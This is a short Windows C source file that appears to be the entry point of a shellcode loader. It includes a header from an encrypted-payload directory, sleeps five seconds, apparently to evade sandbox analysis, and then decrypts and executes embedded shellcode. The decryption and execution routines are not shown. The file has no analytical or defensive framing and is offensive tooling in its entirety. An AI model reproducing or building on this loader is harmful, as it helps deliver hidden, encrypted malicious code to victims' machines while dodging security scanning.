#include <windows.h>
#include "../payload_encrypted/payload.h"

int main() {
    Sleep(5000);
    decryptShellCode();
    startShellCode(); 
    return 0;
}